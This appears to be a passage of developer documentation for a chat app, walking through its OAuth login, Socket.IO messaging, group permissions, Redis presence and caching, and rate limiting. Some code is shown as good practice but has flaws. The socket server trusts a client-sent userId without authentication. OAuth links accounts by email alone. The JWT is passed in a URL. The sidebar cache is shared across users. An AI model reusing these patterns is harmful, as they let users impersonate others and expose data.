### **5.1.6 Google OAuth Flow**

**File:** `backend/src/config/passport.js`

```javascript
import passport from 'passport';
import { Strategy as GoogleStrategy } from 'passport-google-oauth20';
import User from '../models/user.model.js';

passport.use(
    new GoogleStrategy(
        {
            clientID: process.env.GOOGLE_CLIENT_ID,
            clientSecret: process.env.GOOGLE_CLIENT_SECRET,
            callbackURL: process.env.GOOGLE_CALLBACK_URL || 'http://localhost:5001/api/oauth/google/callback',
        },
        async (accessToken, refreshToken, profile, done) => {
            try {
                // Check if user already exists with this Google ID
                let user = await User.findOne({ providerId: profile.id });

                if (user) {
                    // User exists, return it
                    return done(null, user);
                }

                // Check if user exists with same email (link accounts)
                user = await User.findOne({ email: profile.emails[0].value });

                if (user) {
                    // Update existing user with Google OAuth info
                    user.authProvider = 'google';
                    user.providerId = profile.id;
                    user.profilePic = profile.photos[0]?.value || '';
                    await user.save();
                    return done(null, user);
                }

                // Create new user
                user = await User.create({
                    fullName: profile.displayName,
                    email: profile.emails[0].value,
                    username: profile.emails[0].value.split('@')[0] + Math.floor(Math.random() * 1000),
                    authProvider: 'google',
                    providerId: profile.id,
                    profilePic: profile.photos[0]?.value || '',
                });

                done(null, user);
            } catch (error) {
                done(error, null);
            }
        }
    )
);

export default passport;
```

**OAuth Flow Diagram:**
```
1. User clicks "Sign in with Google"
   ↓
2. Frontend: Redirect to /api/oauth/google
   ↓
3. Backend: Redirect to Google's OAuth consent screen
   - URL: https://accounts.google.com/o/oauth2/v2/auth
   - Params: client_id, redirect_uri, scope, response_type
   ↓
4. User approves permissions
   ↓
5. Google redirects to: /api/oauth/google/callback?code=ABC123
   ↓
6. Backend: Exchange code for access token
   - POST to https://oauth2.googleapis.com/token
   ↓
7. Backend: Fetch user profile
   - GET https://www.googleapis.com/oauth2/v1/userinfo
   ↓
8. Backend: Find or create user in database
   ↓
9. Backend: Generate JWT token
   ↓
10. Backend: Redirect to frontend with token
    - URL: http://localhost:5173/oauth/callback?token=JWT_TOKEN
    ↓
11. Frontend: Extract token, store in localStorage, set cookie
    ↓
12. Frontend: Redirect to home page
```

> **Security Consideration:** OAuth2 is more secure than storing passwords because:
> - No password to leak
> - Google handles authentication
> - Scope-limited access tokens
> - User can revoke access anytime

---

## 5.2 Real-Time Messaging System

### **5.2.1 Complete Socket.IO Server Setup**

**File:** `backend/src/lib/socket.js` (Complete 178 lines)

```javascript
import { Server } from "socket.io";
import { createAdapter } from "@socket.io/redis-adapter";
import http from "http";
import express from "express";
import { createClient } from "redis";
import GroupMember from "../models/groupMember.model.js";
import {
    mapSocketToUser,
    removeSocketMapping,
    setUserOnline,
    setUserOffline,
    getOnlineUsers,
    getSocketIdByUserId
} from "./redis.js";

const app = express();
const server = http.createServer(app);

// Initialize Socket.IO server with CORS
const io = new Server(server, {
    cors: {
        origin: process.env.FRONTEND_URL || "http://localhost:5173",
        credentials: true
    },
    pingTimeout: 60000,      // 60 seconds before considering connection dead
    pingInterval: 25000      // Send ping every 25 seconds
});

/**
 * Initialize Redis Adapter for Socket.IO horizontal scaling
 */
export const initializeSocketIO = async () => {
    try {
        const redisUrl = process.env.REDIS_URL || 'redis://localhost:6379';

        // Create pub/sub clients for Socket.IO adapter
        const pubClient = createClient({ url: redisUrl });
        const subClient = pubClient.duplicate();

        await Promise.all([pubClient.connect(), subClient.connect()]);

        // Use Redis adapter for multi-instance support
        io.adapter(createAdapter(pubClient, subClient));

        console.log('✅ Socket.IO Redis Adapter initialized - Multi-instance support enabled');

        // Handle adapter errors
        pubClient.on('error', (err) => console.error('Redis Pub Client Error:', err));
        subClient.on('error', (err) => console.error('Redis Sub Client Error:', err));

    } catch (error) {
        console.warn('⚠️  Redis Adapter initialization failed. Running in single-instance mode.', error.message);
    }
};

/**
 * Get receiver's socket ID from Redis
 * @param {string} userId - User ID
 * @returns {Promise<string|null>} Socket ID or null
 */
export async function getReceiverSocketId(userId) {
    return await getSocketIdByUserId(userId);
}

/**
 * Socket.IO connection handler with Redis-backed presence
 */
io.on("connection", async (socket) => {
    console.log("✅ User connected:", socket.id);

    const userId = socket.handshake.query.userId;

    if (userId && userId !== 'undefined') {
        try {
            // Store socket-user mapping in Redis
            await mapSocketToUser(socket.id, userId);

            // Set user as online in Redis
            await setUserOnline(userId);

            // Join user's groups (as Socket.IO rooms)
            const userGroups = await GroupMember.find({
                userId,
                status: 'active',
            }).select('groupId');

            for (const membership of userGroups) {
                socket.join(membership.groupId.toString());
                console.log(`👥 User ${userId} joined group room: ${membership.groupId}`);
            }

            // Broadcast online users to all clients
            const onlineUsers = await getOnlineUsers();
            io.emit("getOnlineUsers", onlineUsers);

            console.log(`📡 User ${userId} is now online`);
        } catch (error) {
            console.error('Error handling user connection:', error);
        }
    }

    // Handle user disconnect
    socket.on("disconnect", async () => {
        console.log("❌ User disconnected:", socket.id);

        if (userId && userId !== 'undefined') {
            try {
                // Remove socket mapping from Redis
                await removeSocketMapping(socket.id);

                // Set user as offline in Redis
                await setUserOffline(userId);

                // Broadcast updated online users list
                const onlineUsers = await getOnlineUsers();
                io.emit("getOnlineUsers", onlineUsers);

                console.log(`📴 User ${userId} is now offline`);
            } catch (error) {
                console.error('Error handling user disconnect:', error);
            }
        }
    });

    // Handle typing indicator (DM)
    socket.on("typing", async (data) => {
        const receiverSocketId = await getReceiverSocketId(data.receiverId);
        if (receiverSocketId) {
            io.to(receiverSocketId).emit("userTyping", {
                senderId: userId,
                isTyping: data.isTyping
            });
        }
    });

    // Handle group typing indicator
    socket.on("groupTyping", async (data) => {
        const { groupId, isTyping } = data;

        // Broadcast to all group members except sender
        socket.to(groupId).emit("userTypingInGroup", {
            groupId,
            senderId: userId,
            isTyping
        });
    });

    // Handle joining a new group (when user is added to group)
    socket.on("joinGroup", async (data) => {
        const { groupId } = data;

        // Verify user is a member of this group
        const membership = await GroupMember.findOne({
            groupId,
            userId,
            status: 'active',
        });

        if (membership) {
            socket.join(groupId);
            console.log(`👥 User ${userId} joined group room: ${groupId}`);

            // Notify the user they've joined successfully
            socket.emit("groupJoined", { groupId });
        }
    });

    // Handle leaving a group
    socket.on("leaveGroup", (data) => {
        const { groupId } = data;
        socket.leave(groupId);
        console.log(`👋 User ${userId} left group room: ${groupId}`);
    });
});

export { io, app, server };
```

**Key Features:**
1. **Redis Adapter:** Enables multi-instance horizontal scaling
2. **Automatic Group Joining:** Users auto-join all their group rooms on connect
3. **Presence Tracking:** Online/offline status via Redis
4. **Typing Indicators:** Real-time typing events for DM and groups
5. **Connection Management:** Automatic cleanup on disconnect
6. **Error Handling:** Graceful fallback if Redis unavailable

---

### **5.2.2 Redis Adapter Configuration**

**Why Redis Adapter?**

```
WITHOUT Redis Adapter (Single Instance):
┌─────────────────────┐
│  Server Instance 1  │
│  ┌───────────────┐  │
│  │   User A      │  │
│  │   User B      │  │
│  │   User C      │  │
│  └───────────────┘  │
└─────────────────────┘
✅ User A can message User B (same instance)
❌ User A cannot message User D (different instance)


WITH Redis Adapter (Multi-Instance):
┌─────────────────────┐      ┌─────────────────────┐
│  Server Instance 1  │      │  Server Instance 2  │
│  ┌───────────────┐  │      │  ┌───────────────┐  │
│  │   User A      │  │      │  │   User D      │  │
│  │   User B      │  │      │  │   User E      │  │
│  └───────────────┘  │      │  └───────────────┘  │
└──────────┬──────────┘      └──────────┬──────────┘
           │                             │
           └─────────┬───────────────────┘
                     ↓
           ┌─────────────────┐
           │  Redis Pub/Sub  │
           │                 │
           │  Channel:       │
           │  socket.io#/#   │
           └─────────────────┘
✅ User A can message User D (via Redis)
```

**How It Works:**
1. User A (Instance 1) emits event to User D
2. Instance 1 publishes to Redis channel: `socket.io#/#`
3. Redis broadcasts to all subscribers (Instance 1 & 2)
4. Instance 2 receives event and emits to User D
5. User D receives message instantly

---

### **5.2.3 Connection/Disconnect Handlers**

**Connection Flow:**
```javascript
// 1. Client connects with userId
socket.handshake.query.userId = "507f1f77bcf86cd799439011";

// 2. Server creates bidirectional mapping in Redis
await mapSocketToUser(socket.id, userId);
// Redis: hSet('socket_user_map', 'socketABC123', '507f1f77bcf86cd799439011')
// Redis: set('user:507f1f77bcf86cd799439011:socketId', 'socketABC123')

// 3. Set user online
await setUserOnline(userId);
// Redis: sAdd('online_users', '507f1f77bcf86cd799439011')
// Redis: set('user:507f1f77bcf86cd799439011:lastSeen', Date.now())

// 4. Join all user's group rooms
const groups = await GroupMember.find({ userId, status: 'active' });
for (const group of groups) {
    socket.join(group.groupId.toString());
}

// 5. Broadcast online users to all clients
const onlineUsers = await getOnlineUsers();
io.emit("getOnlineUsers", onlineUsers);
// All connected clients receive updated list
```

**Disconnect Flow:**
```javascript
// 1. Server detects disconnect
socket.on("disconnect", async () => {

    // 2. Remove socket mapping
    await removeSocketMapping(socket.id);
    // Redis: hDel('socket_user_map', 'socketABC123')
    // Redis: del('user:507f1f77bcf86cd799439011:socketId')

    // 3. Set user offline
    await setUserOffline(userId);
    // Redis: sRem('online_users', '507f1f77bcf86cd799439011')
    // Redis: set('user:507f1f77bcf86cd799439011:lastSeen', Date.now())

    // 4. Broadcast updated online users
    const onlineUsers = await getOnlineUsers();
    io.emit("getOnlineUsers", onlineUsers);
});
```

---

### **5.2.4 Message Broadcasting Logic**

**DM Message Broadcasting:**
```javascript
// In message.controllers.js → sendMessage()

// After saving message to MongoDB
const newMessage = await Message.create({
    senderId,
    receiverId,
    text,
    image
});

// Get receiver's socket ID from Redis
const receiverSocketId = await getReceiverSocketId(receiverId);

// Emit to receiver if online
if (receiverSocketId) {
    io.to(receiverSocketId).emit("newMessage", newMessage);
}

// Also emit to sender (for multi-device support)
const senderSocketId = await getReceiverSocketId(senderId);
if (senderSocketId) {
    io.to(senderSocketId).emit("newMessage", newMessage);
}
```

**Group Message Broadcasting:**
```javascript
// In groupMessage.controllers.js → sendGroupMessage()

// After saving group message to MongoDB
const newMessage = await Message.create({
    senderId,
    receiverId: groupId,
    isGroupMessage: true,
    text,
    image
});

// Broadcast to all group members (Socket.IO room)
io.to(groupId).emit("newGroupMessage", newMessage);

// This automatically reaches all users who have joined the room
// Including users on different server instances (via Redis Adapter)
```

> **Key Concept:** Socket.IO **rooms** are like chat rooms. When you emit to a room, all sockets in that room receive the event, even across multiple server instances (thanks to Redis Adapter).

---

### **5.2.5 Frontend Socket Integration**

**File:** `frontend/Wisp/src/store/useChatStore.js`

```javascript
import { io } from "socket.io-client";

// Initialize Socket.IO client
const socket = io(BASE_URL, {
    query: { userId: authUser?._id },
    transports: ['websocket', 'polling'],
    autoConnect: false
});

// Subscribe to messages
export const subscribeToMessages = () => {
    socket.on("newMessage", (message) => {
        // Update messages array in Zustand store
        set((state) => ({
            messages: [...state.messages, message]
        }));
    });
};

// Unsubscribe from messages
export const unsubscribeFromMessages = () => {
    socket.off("newMessage");
};

// Send typing indicator
export const sendTypingIndicator = (receiverId, isTyping) => {
    socket.emit("typing", { receiverId, isTyping });
};

// Connect socket
socket.connect();
```

**Connection Lifecycle:**
```
1. User logs in
   ↓
2. Frontend: socket.connect()
   - query: { userId: "507f1f77bcf86cd799439011" }
   ↓
3. Backend: "connection" event
   - Map socket to user
   - Set online status
   - Join group rooms
   ↓
4. User navigates to chat
   ↓
5. Frontend: subscribeToMessages()
   - socket.on("newMessage", handler)
   ↓
6. Backend: New message emitted
   ↓
7. Frontend: Handler receives message
   - Update Zustand store
   - Component re-renders
   ↓
8. User logs out
   ↓
9. Frontend: socket.disconnect()
   ↓
10. Backend: "disconnect" event
    - Remove socket mapping
    - Set offline status
```

---

## 5.3 Group Chat Implementation

### **5.3.1 Group Creation with Validation**

**File:** `backend/src/controllers/group.controllers.js` (createGroup - lines 7-49)

```javascript
export const createGroup = async (req, res) => {
    try {
        const { name, description, groupImage, type, maxMembers, settings } = req.body;
        const userId = req.user._id;

        // Validate group name
        if (!name || name.trim().length < 3) {
            return res.status(400).json({
                error: 'Group name must be at least 3 characters'
            });
        }

        console.log(`Creating group "${name}" for user ${userId}`);

        // Create the group
        const group = await Group.create({
            name,
            description,
            groupImage: groupImage || '',
            createdBy: userId,
            type: type || 'private',
            maxMembers: maxMembers || 100,
            settings: settings || {},
        });

        // Add creator as owner
        await GroupMember.create({
            groupId: group._id,
            userId: userId,
            role: 'owner',
            status: 'active',
        });

        // Populate creator details
        const populatedGroup = await Group.findById(group._id)
            .populate('createdBy', 'username email profilePic');

        console.log(`Successfully created group ${group._id}`);

        res.status(201).json(populatedGroup);
    } catch (error) {
        console.error('Error in createGroup:', error);
        console.error('Stack:', error.stack);
        res.status(500).json({
            error: 'Internal server error'
        });
    }
};
```

**Validation Steps:**
1. **Name Validation:** ≥ 3 characters
2. **Auth Check:** protectRoute middleware ensures user is logged in
3. **Creator Assignment:** User automatically becomes owner
4. **Default Values:** type='private', maxMembers=100
5. **Atomic Operation:** Group + GroupMember created in sequence

---

### **5.3.2 Member Management (Add/Remove/Role)**

**Add Member:**
```javascript
// File: group.controllers.js → addMember (lines 122-216)

export const addMember = async (req, res) => {
    try {
        const { groupId } = req.params;
        const { userIds } = req.body; // Array of user IDs
        const requestingUserId = req.user._id;

        // Validate input
        if (!userIds || !Array.isArray(userIds) || userIds.length === 0) {
            return res.status(400).json({
                error: 'At least one user ID is required'
            });
        }

        // Get group
        const group = await Group.findById(groupId);
        if (!group) {
            return res.status(404).json({ error: 'Group not found' });
        }

        // Check permissions
        const membership = await GroupMember.findOne({
            groupId,
            userId: requestingUserId,
            status: 'active',
        });

        if (!membership || !membership.permissions.canAddMembers) {
            return res.status(403).json({
                error: 'You do not have permission to add members'
            });
        }

        // Check capacity
        const currentMemberCount = await GroupMember.countDocuments({
            groupId,
            status: { $in: ['active', 'pending'] },
        });

        if (currentMemberCount + userIds.length > group.maxMembers) {
            return res.status(400).json({
                error: 'Group is at maximum capacity'
            });
        }

        // Validate all user IDs exist
        const users = await User.find({ _id: { $in: userIds } });
        if (users.length !== userIds.length) {
            return res.status(400).json({
                error: 'One or more user IDs are invalid'
            });
        }

        // Add members
        const addedMembers = [];
        for (const userId of userIds) {
            const existingMember = await GroupMember.findOne({ groupId, userId });

            if (existingMember) {
                if (existingMember.status === 'left' || existingMember.status === 'banned') {
                    // Reactivate member
                    existingMember.status = group.settings.requireApproval ? 'pending' : 'active';
                    existingMember.joinedAt = Date.now();
                    await existingMember.save();
                    addedMembers.push(existingMember);
                }
            } else {
                // Create new member
                const newMember = await GroupMember.create({
                    groupId,
                    userId,
                    role: 'member',
                    status: group.settings.requireApproval ? 'pending' : 'active',
                });
                addedMembers.push(newMember);
            }
        }

        // Update group stats
        const activeMemberCount = await GroupMember.countDocuments({
            groupId,
            status: 'active',
        });
        group.stats.totalMembers = activeMemberCount;
        await group.save();

        // Populate member details
        const populatedMembers = await GroupMember.find({
            _id: { $in: addedMembers.map(m => m._id) }
        }).populate('userId', 'username email profilePic');

        res.status(200).json(populatedMembers);
    } catch (error) {
        console.error('Error in addMember:', error);
        res.status(500).json({ error: 'Internal server error' });
    }
};
```

**Permission Checks:**
1. User must be active member
2. User must have `canAddMembers` permission
3. Group must not be at max capacity
4. All user IDs must be valid

---

**Remove Member:**
```javascript
// File: group.controllers.js → removeMember (lines 218-273)

export const removeMember = async (req, res) => {
    try {
        const { groupId, memberId } = req.params;
        const requestingUserId = req.user._id;

        // Check requesting user's permissions
        const requestingMembership = await GroupMember.findOne({
            groupId,
            userId: requestingUserId,
            status: 'active',
        });

        if (!requestingMembership || !requestingMembership.permissions.canRemoveMembers) {
            return res.status(403).json({
                error: 'You do not have permission to remove members'
            });
        }

        // Get target member
        const targetMembership = await GroupMember.findOne({
            groupId,
            userId: memberId,
        });

        if (!targetMembership) {
            return res.status(404).json({
                error: 'Member not found in this group'
            });
        }

        // Prevent removing owner
        if (targetMembership.role === 'owner') {
            return res.status(403).json({
                error: 'Cannot remove the group owner'
            });
        }

        // Admins cannot remove other admins unless they are the owner
        if (targetMembership.role === 'admin' && requestingMembership.role !== 'owner') {
            return res.status(403).json({
                error: 'Only the owner can remove admins'
            });
        }

        // Update member status to 'left'
        targetMembership.status = 'left';
        await targetMembership.save();

        // Update group stats
        const group = await Group.findById(groupId);
        const activeMemberCount = await GroupMember.countDocuments({
            groupId,
            status: 'active',
        });
        group.stats.totalMembers = activeMemberCount;
        await group.save();

        res.status(200).json({ message: 'Member removed successfully' });
    } catch (error) {
        console.error('Error in removeMember:', error);
        res.status(500).json({ error: 'Internal server error' });
    }
};
```

**Hierarchy Protection:**
- Owner cannot be removed
- Only owner can remove admins
- Admins can remove members
- Members cannot remove anyone

---

**Update Member Role:**
```javascript
// File: group.controllers.js → updateMemberRole (lines 275-327)

export const updateMemberRole = async (req, res) => {
    try {
        const { groupId, memberId } = req.params;
        const { role } = req.body; // 'admin' or 'member'
        const requestingUserId = req.user._id;

        // Only owner can change roles
        const requestingMembership = await GroupMember.findOne({
            groupId,
            userId: requestingUserId,
            role: 'owner',
            status: 'active',
        });

        if (!requestingMembership) {
            return res.status(403).json({
                error: 'Only the group owner can change member roles'
            });
        }

        // Get target member
        const targetMembership = await GroupMember.findOne({
            groupId,
            userId: memberId,
            status: 'active',
        });

        if (!targetMembership) {
            return res.status(404).json({
                error: 'Member not found in this group'
            });
        }

        // Cannot change owner role
        if (targetMembership.role === 'owner') {
            return res.status(403).json({
                error: 'Cannot change the owner role'
            });
        }

        // Validate role
        if (!['admin', 'member'].includes(role)) {
            return res.status(400).json({
                error: 'Invalid role. Must be "admin" or "member"'
            });
        }

        // Update role (pre-save middleware will set permissions)
        targetMembership.role = role;
        await targetMembership.save();

        const populatedMember = await GroupMember.findById(targetMembership._id)
            .populate('userId', 'username email profilePic');

        res.status(200).json(populatedMember);
    } catch (error) {
        console.error('Error in updateMemberRole:', error);
        res.status(500).json({ error: 'Internal server error' });
    }
};
```

> **Key Concept:** Only the **owner** can promote/demote members. The owner role cannot be transferred (would require separate transfer ownership endpoint).

---

### **5.3.3 Permission System (Pre-Save Middleware)**

**File:** `backend/src/models/groupMember.model.js` (lines 92-123)

```javascript
// Pre-save middleware to set permissions based on role
groupMemberSchema.pre('save', function(next) {
    if (this.isModified('role')) {
        switch(this.role) {
            case 'owner':
                this.permissions = {
                    canSendMessages: true,
                    canAddMembers: true,
                    canRemoveMembers: true,
                    canEditGroup: true,
                };
                break;
            case 'admin':
                this.permissions = {
                    canSendMessages: true,
                    canAddMembers: true,
                    canRemoveMembers: true,
                    canEditGroup: true,
                };
                break;
            case 'member':
                this.permissions = {
                    canSendMessages: true,
                    canAddMembers: false,
                    canRemoveMembers: false,
                    canEditGroup: false,
                };
                break;
        }
    }
    next();
});
```

**Permission Matrix:**

| Permission | Member | Admin | Owner |
|------------|--------|-------|-------|
| canSendMessages | ✅ | ✅ | ✅ |
| canAddMembers | ❌ | ✅ | ✅ |
| canRemoveMembers | ❌ | ✅ | ✅ |
| canEditGroup | ❌ | ✅ | ✅ |
| Change roles | ❌ | ❌ | ✅ |
| Delete group | ❌ | ❌ | ✅ |

> **Why This Matters:** Permissions are **automatically set** whenever the role changes. No need to manually update permissions in every controller.

---

### **5.3.4 Socket.IO Rooms for Groups**

**How Group Rooms Work:**

```javascript
// When user connects, auto-join all their groups
io.on("connection", async (socket) => {
    const userId = socket.handshake.query.userId;

    // Find all groups user is a member of
    const userGroups = await GroupMember.find({
        userId,
        status: 'active',
    }).select('groupId');

    // Join each group as a Socket.IO room
    for (const membership of userGroups) {
        socket.join(membership.groupId.toString());
        console.log(`User ${userId} joined group room: ${membership.groupId}`);
    }
});

// When sending group message
export const sendGroupMessage = async (req, res) => {
    // ... save message to database ...

    // Broadcast to all group members
    io.to(groupId).emit("newGroupMessage", newMessage);
    // This reaches ALL users in the room, even on different server instances
};

// When user is added to group
socket.on("joinGroup", async (data) => {
    const { groupId } = data;

    // Verify membership
    const membership = await GroupMember.findOne({
        groupId,
        userId,
        status: 'active',
    });

    if (membership) {
        socket.join(groupId);
        socket.emit("groupJoined", { groupId });
    }
});
```

**Room Benefits:**
1. **Targeted Broadcasting:** Only group members receive messages
2. **Automatic Distribution:** Socket.IO handles routing
3. **Multi-Instance Support:** Redis Adapter syncs rooms across servers
4. **Dynamic Membership:** Users join/leave rooms as they join/leave groups

---

## 5.4 Redis-Backed Presence System

### **5.4.1 All Redis Functions**

**File:** `backend/src/lib/redis.js` (Complete 252 lines)

```javascript
import { createClient } from 'redis';

let redisClient = null;
let isConnected = false;

/**
 * Initialize Redis client with connection handling
 */
export const connectRedis = async () => {
    try {
        const redisUrl = process.env.REDIS_URL || 'redis://localhost:6379';

        redisClient = createClient({
            url: redisUrl,
            socket: {
                reconnectStrategy: (retries) => {
                    if (retries > 3) {
                        console.error('Redis: Too many reconnection attempts. Stopping.');
                        return new Error('Too many retries');
                    }
                    // Exponential backoff: 50ms, 100ms, 200ms, 400ms...
                    return Math.min(retries * 50, 3000);
                }
            }
        });

        // Error handler
        redisClient.on('error', (err) => {
            console.error('Redis Client Error:', err.message);
            isConnected = false;
        });

        // Connection success handler
        redisClient.on('connect', () => {
            console.log('🔴 Redis connecting...');
        });

        redisClient.on('ready', () => {
            console.log('✅ Redis connected successfully');
            isConnected = true;
        });

        // Disconnection handler
        redisClient.on('end', () => {
            console.log('❌ Redis disconnected');
            isConnected = false;
        });

        // Connect to Redis
        await redisClient.connect();

        return redisClient;
    } catch (error) {
        console.warn('⚠️  Failed to connect to Redis - continuing without Redis:', error.message);
        redisClient = null;
        isConnected = false;
        return null;
    }
};

/**
 * Get Redis client instance
 */
export const getRedisClient = () => {
    if (!redisClient) {
        throw new Error('Redis client not initialized. Call connectRedis() first.');
    }
    return redisClient;
};

/**
 * Check if Redis is connected
 */
export const isRedisConnected = () => isConnected;

/**
 * Close Redis connection gracefully
 */
export const disconnectRedis = async () => {
    if (redisClient) {
        await redisClient.quit();
        console.log('Redis connection closed');
    }
};

/**
 * Cache user data with TTL (Time To Live)
 * @param {string} userId - User ID
 * @param {object} userData - User data to cache
 * @param {number} ttl - Time to live in seconds (default: 300 = 5 minutes)
 */
export const cacheUser = async (userId, userData, ttl = 300) => {
    try {
        const client = getRedisClient();
        const key = `user:${userId}`;
        await client.setEx(key, ttl, JSON.stringify(userData));
    } catch (error) {
        console.error('Error caching user:', error);
    }
};

/**
 * Get cached user data
 * @param {string} userId - User ID
 * @returns {object|null} User data or null if not found
 */
export const getCachedUser = async (userId) => {
    try {
        const client = getRedisClient();
        const key = `user:${userId}`;
        const data = await client.get(key);
        return data ? JSON.parse(data) : null;
    } catch (error) {
        console.error('Error getting cached user:', error);
        return null;
    }
};

/**
 * Delete cached user data
 * @param {string} userId - User ID
 */
export const deleteCachedUser = async (userId) => {
    try {
        const client = getRedisClient();
        const key = `user:${userId}`;
        await client.del(key);
    } catch (error) {
        console.error('Error deleting cached user:', error);
    }
};

/**
 * Set user online status
 * @param {string} userId - User ID
 */
export const setUserOnline = async (userId) => {
    try {
        const client = getRedisClient();
        await client.sAdd('online_users', userId);
        await client.set(`user:${userId}:lastSeen`, Date.now().toString());
    } catch (error) {
        console.error('Error setting user online:', error);
    }
};

/**
 * Set user offline status
 * @param {string} userId - User ID
 */
export const setUserOffline = async (userId) => {
    try {
        const client = getRedisClient();
        await client.sRem('online_users', userId);
        await client.set(`user:${userId}:lastSeen`, Date.now().toString());
    } catch (error) {
        console.error('Error setting user offline:', error);
    }
};

/**
 * Get all online users
 * @returns {Array<string>} Array of online user IDs
 */
export const getOnlineUsers = async () => {
    try {
        const client = getRedisClient();
        return await client.sMembers('online_users');
    } catch (error) {
        console.error('Error getting online users:', error);
        return [];
    }
};

/**
 * Map socket ID to user ID (bidirectional)
 * @param {string} socketId - Socket ID
 * @param {string} userId - User ID
 */
export const mapSocketToUser = async (socketId, userId) => {
    try {
        const client = getRedisClient();
        // Store socket → user mapping
        await client.hSet('socket_user_map', socketId, userId);
        // Store user → socket mapping
        await client.set(`user:${userId}:socketId`, socketId);
    } catch (error) {
        console.error('Error mapping socket to user:', error);
    }
};

/**
 * Get user ID by socket ID
 * @param {string} socketId - Socket ID
 * @returns {string|null} User ID or null
 */
export const getUserBySocketId = async (socketId) => {
    try {
        const client = getRedisClient();
        return await client.hGet('socket_user_map', socketId);
    } catch (error) {
        console.error('Error getting user by socket ID:', error);
        return null;
    }
};

/**
 * Get socket ID by user ID
 * @param {string} userId - User ID
 * @returns {string|null} Socket ID or null
 */
export const getSocketIdByUserId = async (userId) => {
    try {
        const client = getRedisClient();
        return await client.get(`user:${userId}:socketId`);
    } catch (error) {
        console.error('Error getting socket ID by user ID:', error);
        return null;
    }
};

/**
 * Remove socket mapping
 * @param {string} socketId - Socket ID
 */
export const removeSocketMapping = async (socketId) => {
    try {
        const client = getRedisClient();
        // Get userId first
        const userId = await client.hGet('socket_user_map', socketId);
        if (userId) {
            // Delete both mappings
            await client.hDel('socket_user_map', socketId);
            await client.del(`user:${userId}:socketId`);
        }
    } catch (error) {
        console.error('Error removing socket mapping:', error);
    }
};

export default {
    connectRedis,
    getRedisClient,
    isRedisConnected,
    disconnectRedis,
    cacheUser,
    getCachedUser,
    deleteCachedUser,
    setUserOnline,
    setUserOffline,
    getOnlineUsers,
    mapSocketToUser,
    getUserBySocketId,
    getSocketIdByUserId,
    removeSocketMapping
};
```

---

### **5.4.2 Online/Offline Tracking**

**Data Structures in Redis:**

1. **Set: `online_users`**
   - Stores user IDs of all online users
   - Operations: `sAdd`, `sRem`, `sMembers`
   - Example: `['507f...011', '507f...012', '507f...013']`

2. **String: `user:{userId}:lastSeen`**
   - Unix timestamp of last activity
   - Updated on connect/disconnect
   - Example: `user:507f...011:lastSeen` → `1699564800000`

**Flow:**
```
User Connects:
1. sAdd('online_users', userId)
2. set(`user:${userId}:lastSeen`, Date.now())
3. Broadcast: io.emit("getOnlineUsers", [...online_users])

User Disconnects:
1. sRem('online_users', userId)
2. set(`user:${userId}:lastSeen`, Date.now())
3. Broadcast: io.emit("getOnlineUsers", [...online_users])
```

---

### **5.4.3 Socket Mapping (Bidirectional)**

**Why Bidirectional?**

```
Scenario 1: Receive message from User A
- Need to find User B's socket ID to emit message
- Lookup: userId → socketId
- Redis: get(`user:${userB}:socketId`) → "socketDEF456"

Scenario 2: User disconnects
- Need to find userId from socket ID for cleanup
- Lookup: socketId → userId
- Redis: hGet('socket_user_map', 'socketDEF456') → userB

Solution: Store BOTH mappings
1. Hash: socket_user_map { socketId → userId }
2. String: user:{userId}:socketId → socketId
```

**Implementation:**
```javascript
// On connect
await mapSocketToUser(socket.id, userId);
// Creates:
// 1. hSet('socket_user_map', 'socketABC123', '507f...011')
// 2. set('user:507f...011:socketId', 'socketABC123')

// On disconnect
await removeSocketMapping(socket.id);
// Deletes both:
// 1. hDel('socket_user_map', 'socketABC123')
// 2. del('user:507f...011:socketId')
```

---

### **5.4.4 User Caching with TTL**

**Purpose:** Reduce database queries for frequently accessed user data.

```javascript
// When fetching user for sidebar
export const getUsersForSidebar = async (req, res) => {
    try {
        const loggedInUserId = req.user._id;

        // Try to get from cache first
        const cachedUsers = await getCachedUser('users_sidebar');
        if (cachedUsers) {
            return res.status(200).json(cachedUsers);
        }

        // Cache miss - fetch from database
        const users = await User.find({ _id: { $ne: loggedInUserId } })
            .select("-password");

        // Cache for 5 minutes (300 seconds)
        await cacheUser('users_sidebar', users, 300);

        res.status(200).json(users);
    } catch (error) {
        console.error("Error in getUsersForSidebar:", error.message);
        res.status(500).json({ error: "Internal server error" });
    }
};
```

**Benefits:**
1. **Reduced DB Load:** Repeat requests served from Redis (sub-1ms)
2. **Auto-Expiration:** TTL of 300s (5 minutes) keeps data fresh
3. **Graceful Degradation:** Cache errors don't break app

> **Key Concept:** Redis is **in-memory**, so queries are 10-100x faster than MongoDB. Use for hot data, not cold storage.

---

## 5.5 Rate Limiting Strategy

### **5.5.1 All 6 Rate Limiter Tiers**

**File:** `backend/src/middleware/rateLimiter.js` (Complete 125 lines)

```javascript
import rateLimit from 'express-rate-limit';
import { RedisStore } from 'rate-limit-redis';
import { getRedisClient, isRedisConnected } from '../lib/redis.js';

/**
 * Create rate limiter with Redis store
 * @param {Object} options - Rate limit options
 * @returns {Function} Rate limit middleware
 */
const createRateLimiter = (options = {}) => {
    const {
        windowMs = 15 * 60 * 1000, // 15 minutes default
        max = 100, // Max requests per window
        message = 'Too many requests, please try again later.',
        skipSuccessfulRequests = false,
        skipFailedRequests = false,
    } = options;

    // Check if Redis is connected before trying to use it
    if (!isRedisConnected()) {
        console.warn('⚠️  Redis not connected for rate limiting, using memory store');

        // Fallback to memory store if Redis is unavailable
        return rateLimit({
            windowMs,
            max,
            message: { error: message },
            standardHeaders: true,
            legacyHeaders: false,
            skipSuccessfulRequests,
            skipFailedRequests,
        });
    }

    try {
        const redisClient = getRedisClient();

        return rateLimit({
            windowMs,
            max,
            message: { error: message },
            standardHeaders: true, // Return rate limit info in `RateLimit-*` headers
            legacyHeaders: false, // Disable `X-RateLimit-*` headers
            skipSuccessfulRequests,
            skipFailedRequests,
            store: new RedisStore({
                // @ts-expect-error - RedisStore expects different client type
                sendCommand: (...args) => redisClient.sendCommand(args),
            }),
            // Custom key generator - use IP + user ID if authenticated
            keyGenerator: (req) => {
                if (req.user && req.user._id) {
                    return `${req.ip}-${req.user._id}`;
                }
                return req.ip;
            },
        });
    } catch (error) {
        console.warn('⚠️  Redis error for rate limiting, using memory store:', error.message);

        // Fallback to memory store if Redis is unavailable
        return rateLimit({
            windowMs,
            max,
            message: { error: message },
            standardHeaders: true,
            legacyHeaders: false,
            skipSuccessfulRequests,
            skipFailedRequests,
        });
    }
};

// Global rate limiter - More lenient in development and production
export const globalLimiter = createRateLimiter({
    windowMs: 15 * 60 * 1000,
    max: process.env.NODE_ENV === 'development' ? 1000 : 500,
